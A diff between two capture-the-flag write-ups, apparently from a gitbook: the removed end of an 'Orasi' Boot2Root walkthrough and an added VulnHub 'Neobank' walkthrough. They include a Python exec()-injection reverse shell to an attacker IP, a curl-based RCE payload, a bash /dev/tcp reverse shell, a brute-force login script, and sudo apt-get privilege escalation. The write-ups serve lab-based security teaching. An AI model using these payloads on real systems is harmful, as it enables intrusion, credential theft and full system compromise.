-        sb.append(hashMap.get(split[4]));
-        string = sb.toString();
-        System.out.println(string);
-        return string;
-    }
-}
+    print(f"[*] Loaded {len(emails)} email(s) and {len(pins)} PIN(s).")
+    print(f"[*] Starting brute-force operation...\n")
+
+    # Iterate through all email and PIN combinations
+    for pin in pins:
+        for email in emails:
+            if attempt_login(email, pin):
+                return  # Exit on first valid credential pair found
+
+if __name__ == "__main__":
+    main()
 ```
 
-This code defines a simple login system in the **LoginDataSource** class, where the **login** method authenticates a user by checking if the username is **irida** and if the password, after being passed through a custom transformation method called **protector**, matches a specific hashed structure built from a **#**-separated string (**"1#2#3#4#5"**) mapping numeric keys to values like **"eye.of.the.tiger()"**. If the credentials match, it returns a success result with a generated **UUID** and the name **Irida Orasis**; otherwise, it returns an error. The **protector** method acts as a basic obfuscation mechanism for the expected password.
+It's important to note that the brute-force process may be time-consuming due to the volume of PIN combinations being tested. Patience is required as the operation progresses through each credential pair systematically.
 
-This strongly indicates that the password for the user irida is being revealed here, but where exactly? If you recall from our **Nmap** scan, the SSH service is open. It's possible that the password found in the code belongs to irida. If that's the case, we might be able to log in via SSH using her credentials.
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FABEQyRXZkcGhUQE3oF6p%252FScreenshot%2520%281316%29.png%3Falt%3Dmedia%26token%3D517a1c2c-c874-4fc6-bc67-47b493f561b5&width=768&dpr=3&quality=100&sign=35e6de1&sv=2)
 
-`ssh irida@192.168.121.147`
+After a significant amount of time, the valid credentials were eventually identified.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FP4Ex5peO3FXoYdNGyaIv%252FScreenshot%2520%28835%29.png%3Falt%3Dmedia%26token%3Dceb3a2ed-7191-4dee-acd0-47ed0794acb1&width=768&dpr=3&quality=100&sign=bd178679&sv=2)
+With both the email and corresponding PIN now obtained, we can proceed to authenticate to the target application.
 
-It works!!!
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUiSL2cQl1ddX9HDVCM0i%252FScreenshot%2520%281317%29.png%3Falt%3Dmedia%26token%3D8ee069a0-1304-4712-a4f4-c724d6c5c02e&width=768&dpr=3&quality=100&sign=5df152d1&sv=2)
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F0jO3lYmAp9LJtquiWmFE%252FScreenshot%2520%28836%29.png%3Falt%3Dmedia%26token%3Dea33203e-2167-4b1e-ba12-0589289141c1&width=768&dpr=3&quality=100&sign=d8071422&sv=2)
+### Locating the QR Code and Bypassing 2FA
 
----
+Upon successful login, the application prompts for a second authentication factor—a time-based one-time password (TOTP). However, the challenge lies in locating the secret key or QR code required to configure it in an authenticator app.
 
-# Privilege Escalation (irida → root)
-`tags: sudo-misconfiguration, python-code-injection, exec-function-abuse, reverse-shell`
+I proceeded to enumerate accessible subdirectories and came across one named `/qr`
 
-## Vulnerability Discovered: Unsafe Use of Python exec() on Hex-Decoded Input
+`gobuster dir -u http://192.168.191.78:5000/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 -x html,php,txt -q`
 
-Now it's time to escalate privilege
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fxxf5p2KG0OBPLwGDXOmp%252FScreenshot%2520%281318%29.png%3Falt%3Dmedia%26token%3D9298e09a-9a07-4fa2-ab8d-c99eb77324e6&width=768&dpr=3&quality=100&sign=252e7f85&sv=2)
 
-First thing is to check the sudo permissions as always
+Navigating to the `/qr` directory revealed a QR code, which is commonly used to set up TOTP-based 2FA in authenticator applications.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fb9KIuWmvDFmFmV5OduTk%252FScreenshot%2520%28837%29.png%3Falt%3Dmedia%26token%3Db895279d-d809-4739-aedb-23b0d2f0670d&width=768&dpr=3&quality=100&sign=31875e02&sv=2)
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fb6Hhxa2yF9h9spAafTnb%252FScreenshot%2520%281319%29.png%3Falt%3Dmedia%26token%3Db68a0af3-a499-4cba-983d-fdfc2a86de8f&width=768&dpr=3&quality=100&sign=cb1730a2&sv=2)
 
-As shown here, we are allowed to execute a Python script as root, but we don't have the permission to read the file. So our only option here is to execute the script
+After scanning the QR code using an authenticator app on my phone, it successfully generated a valid TOTP code.
 
-`sudo python3 /root/oras.py`
+Upon submitting the 6-digit TOTP code, the application redirected to the following page.
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fzpo8H0VHRWlQdUpBElvx%252FScreenshot%2520%28839%29.png%3Falt%3Dmedia%26token%3D03d75621-7e6b-450b-85a7-71fc085f2ed6&width=768&dpr=3&quality=100&sign=6e2a1b2a&sv=2)
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FNLNJbBmx3TLGGJUcxnbh%252FScreenshot%2520%281320%29.png%3Falt%3Dmedia%26token%3D53ad532e-8120-4489-a120-176e6b27ef22&width=768&dpr=3&quality=100&sign=2fd65c01&sv=2)
 
-The input is expected to be in **hexadecimal byte** format, which will then be decoded into a string. So, we need to adjust the command accordingly.
+Looks like a banking system
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FhdqObNIDKRuhpgjP4k0C%252FScreenshot%2520%28841%29.png%3Falt%3Dmedia%26token%3D05bfb6d3-09b8-47dc-b8ed-da0762c2fcbf&width=768&dpr=3&quality=100&sign=f2a7d777&sv=2)
+### Discovering the Withdraw Parameter Vulnerability
 
-It appears that Python commands can be injected, as the input is being passed directly to the **exec** function. This function can execute multiple lines of Python code, making it a potential injection point.
+Since it's a banking system that allows balance withdrawals, let's go ahead and try withdrawing.
 
-My plan here is to execute a reverse shell payload. But before that, we'll set up a listener on our attacker machine. If everything works as intended, it should grant us a root shell.
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fmy3OA8LQZeohkCb4keIa%252FScreenshot%2520%281322%29.png%3Falt%3Dmedia%26token%3D91d6c5a3-ec14-4370-a0ee-c6cb4d26138b&width=768&dpr=3&quality=100&sign=9a12045e&sv=2)
 
-`python3 -c "print(b"import socket,os,pty;s=socket.socket();s.connect(('192.168.121.32',5454));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('sh')".hex())" | sudo python3 /root/oras.py`
+That's odd—why did it turn negative? Seems like there's a logic flaw here. Let's launch Burp Suite and dig deeper.
 
-Execute and here's the result
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FsyFNM4zN2jnHodflaV3X%252FScreenshot%2520%281323%29.png%3Falt%3Dmedia%26token%3Db05b72b2-e47a-4d39-af7d-3f31506f4e1e&width=768&dpr=3&quality=100&sign=eb8cd5f5&sv=2)
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FVsHKXLfWzWJPUwuXkBiO%252FScreenshot%2520%28842%29.png%3Falt%3Dmedia%26token%3Dac2eadd2-c6e3-444f-bb9c-5f61e4dafe13&width=768&dpr=3&quality=100&sign=1d098cae&sv=2)
+While reviewing, I identified a URL parameter named `withdraw`, which appears to control the amount being withdrawn. To verify its functionality, I modified the parameter to `1` and observed that the application successfully processed the request and returned an appropriate response. This confirms that the `withdraw` parameter plays a direct role in the application's transaction logic. Given its behavior and lack of apparent validation, this parameter may potentially serve as an entry point for further exploitation—possibly leading to remote code execution (RCE) if improperly handled on the backend.
 
-It works!!! We're now root!!
+### Achieving Remote Code Execution
 
-![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUJq7L1QmDlH6SN31NPgb%252FScreenshot%2520%28844%29.png%3Falt%3Dmedia%26token%3D6b017c54-aae1-47cd-9919-c555662c1ad3&width=768&dpr=3&quality=100&sign=fdc1f5e0&sv=2)
+After trying different payloads, this one works:
 
-We've successfully pwned Orasi!
+`__import__('os').system('curl <attacker_ip>')`
 
----
+All I did is to setup an http server in my attacker machine to see if that request will be sent to the server. and it is.
 
-# Conclusion
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWIXYK5VyVzXDXzw6EgZQ%252FScreenshot%2520%281329%29.png%3Falt%3Dmedia%26token%3D065ce9db-9111-4768-9ab5-30df05e9b53e&width=768&dpr=3&quality=100&sign=2f423c2a&sv=2)
 
-This Boot2Root challenge was quite a journey, definitely time-consuming and a bit lengthy to work through, haha. However, it was packed with valuable learning experiences. It covered a wide range of concepts essential to both CTF competitions and real-world ethical hacking, including reverse engineering, crafting reverse shells, and adapting when standard tools aren't available. It really emphasizes the importance of creativity, persistence, and a solid understanding of system behavior. Challenges like this push you to think outside the box and sharpen your problem-solving skills, all while having a bit of fun along the way.
+### Gaining a Reverse Shell
+
+At this stage, the goal is to establish a reverse shell connection to gain remote access to the target system. For this, I crafted a payload designed to initiate a reverse shell using bash:
+
+`/bin/bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<attacker_port> 0>&1'`
+
+The next step is to configure a listener on our machine using **ncat**.
+
+`nc -lnvp 1234`
+
+Once the payload is delivered to the server, it is expected to establish a shell connection back to us.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FOCevaVK7Yf2ec5l4vTMj%252FScreenshot%2520%281330%29.png%3Falt%3Dmedia%26token%3D7ce5957d-a183-4672-ad07-65a1cd927c5c&width=768&dpr=3&quality=100&sign=c76c531e&sv=2)
+
+Notice that the payload is URL-encoded
+
+Here's our listener:
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8RnPLw0aQapKYO8ufGds%252FScreenshot%2520%281331%29.png%3Falt%3Dmedia%26token%3D986bdd26-a0c9-4bc6-b610-8cf76b554565&width=768&dpr=3&quality=100&sign=25519e06&sv=2)
+
+### Extracting Database Credentials
+
+Within the `/var/www/html` directory, I located a file named `main.py`. Let's examine its contents.
+
+It's important to note that the MariaDB username and password are hard-coded within the script. This indicates that the system utilizes a database management system (DBMS) to store user information, including the email addresses previously discovered. The next step is to attempt logging into the database using these credentials.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FTU6Z7X1dSKBz97oB3sOV%252FScreenshot%2520%281338%29.png%3Falt%3Dmedia%26token%3Da5e63d84-ca25-4f0b-9ad2-a6b55710ca79&width=768&dpr=3&quality=100&sign=e1a3bbec&sv=2)
+
+Access to the database was successfully gained. Upon inspecting the available databases, I identified one named `bank`. Within this database, there are two distinct tables.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Flx0JpB2EuKB0D6ggtowp%252FScreenshot%2520%281340%29.png%3Falt%3Dmedia%26token%3D0d147a2b-4b34-40d2-a96e-3b4c2d7caa23&width=768&dpr=3&quality=100&sign=e9af6ea5&sv=2)
+
+The`accounts`table contains the user records, including their email addresses and hashed PINs.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FJsiSt2uk8UWqq0b7zpOJ%252FScreenshot%2520%281341%29.png%3Falt%3Dmedia%26token%3D1c159218-5924-449c-8089-12795e627773&width=768&dpr=3&quality=100&sign=1820b098&sv=2)
+
+Within the `system` table, I found the plaintext password associated with the user named `banker`.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FWiO6ld1NLwcyOXIBaYMg%252FScreenshot%2520%281342%29.png%3Falt%3Dmedia%26token%3D4e30fc7e-0f33-4290-817c-cab5b4f4a2f1&width=768&dpr=3&quality=100&sign=5b6be7ef&sv=2)
+
+### Escalating to User Banker
+
+Now let's switch to user `banker` .
+
+`su banker`
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F8fbcVK7Q8CNG3ByKPDEd%252FScreenshot%2520%281343%29.png%3Falt%3Dmedia%26token%3D960e7c98-b068-47a3-99be-b77ca040ca08&width=768&dpr=3&quality=100&sign=30760c04&sv=2)
+
+At this point, we successfully compromised the user `banker` and obtained the user-level flag.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F08O23Ve5w6hhjITWulvt%252FScreenshot%2520%281344%29.png%3Falt%3Dmedia%26token%3Dc23f040f-0a42-440b-a5ab-778c492bfc85&width=768&dpr=3&quality=100&sign=c18c632&sv=2)
+
+User flag!!!
+
+## Privilege Escalation
+
+### Enumerating Sudo Privileges
+
+With initial access established, the next objective is to escalate privileges and gain root access. To begin the privilege escalation process, I examined which commands could be executed with elevated privileges by running `sudo -l`.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F9wGdl6xZzEiuGnFZK0M7%252FScreenshot%2520%281347%29.png%3Falt%3Dmedia%26token%3Dc5410bc8-197c-4e75-9c06-41174cf1b528&width=768&dpr=3&quality=100&sign=8a69047a&sv=2)
+
+It appears that the `apt-get` command can be executed with elevated privileges via `sudo`. This is significant because `apt-get` is a package management tool used on Debian-based systems (such as Ubuntu) to install, upgrade, and manage software packages. When misconfigured or unrestricted under `sudo`, it can be leveraged to escalate privileges—potentially allowing an attacker to gain root access through methods like installing packages with post-installation scripts.
+
+### Abusing apt-get via GTFOBins
+
+To explore potential ways to leverage `apt-get` for privilege escalation, I consulted GTFOBins—a well-known resource that documents how common Linux binaries can be exploited when misconfigured.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252F1Nns8uxjyciRTnZwQVmP%252FScreenshot%2520%281348%29.png%3Falt%3Dmedia%26token%3D029b85d6-25f5-4337-8e5c-88e34ee8ec93&width=768&dpr=3&quality=100&sign=8a7ccfe5&sv=2)
+
+The `apt-get changelog` command **downloads the changelog over HTTP or HTTPS and opens it using the default pager** (usually `less`, `more`, etc.). If that pager allows us to **run shell commands**, then we can escape to a shell **from inside the pager**.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FjkgVHxoFkHaQ4liKhqPi%252FScreenshot%2520%281352%29.png%3Falt%3Dmedia%26token%3D46886e29-5e57-4721-9a73-2009ed8fe3cb&width=768&dpr=3&quality=100&sign=28fe7b98&sv=2)
+
+### Obtaining Root Access
+
+At this point, it's evident that privilege escalation is possible. Executing the final command and pressing Enter should result in a root shell being spawned.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252FUYfXp1WgqfUAo9uxMOxD%252FScreenshot%2520%281353%29.png%3Falt%3Dmedia%26token%3D8a864e90-2220-4ab2-8310-712e16d4b932&width=768&dpr=3&quality=100&sign=c943e7ed&sv=2)
+
+Root access has been successfully obtained—Neobank has been fully compromised.
+
+![](https://kur0sh1r0.gitbook.io/ctf-writeups/~gitbook/image?url=https%3A%2F%2F271954773-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FYsivTjPn2jLXI0ZgVqeF%252Fuploads%252Fixc5MHuhhFOzJA4k837H%252FScreenshot%2520%281355%29.png%3Falt%3Dmedia%26token%3D75fce0ed-6de6-4566-98dc-f97733e77464&width=768&dpr=3&quality=100&sign=842625ff&sv=2)
+
+Root flag
+
+## Conclusion
+
+This assessment successfully demonstrated a full compromise of the *Neobank* machine hosted on VulnHub. The engagement began with reconnaissance using `nmap`, followed by web enumeration that led to the discovery of exposed subdirectories and email data. By leveraging this information, a custom brute-force script was developed to bypass an intentionally vague login mechanism and identify valid credentials.
+
+Subsequently, a time-based two-factor authentication (2FA) challenge was bypassed by locating and scanning a QR code linked to a TOTP generator. Post-authentication, parameter tampering was observed in the `withdraw` functionality, which ultimately provided a foothold for Remote Code Execution (RCE) via a crafted reverse shell payload.
+
+Privilege escalation was achieved by identifying `apt-get` as an executable command with elevated privileges through `sudo`. Utilizing guidance from GTFOBins, the misconfiguration was exploited to gain root access.
+
+The engagement successfully uncovered multiple security flaws across the attack chain—from information disclosure and weak authentication mechanisms to improper input handling and insecure privilege escalation paths—highlighting critical areas that need to be addressed in the application and system configuration to improve overall security posture.
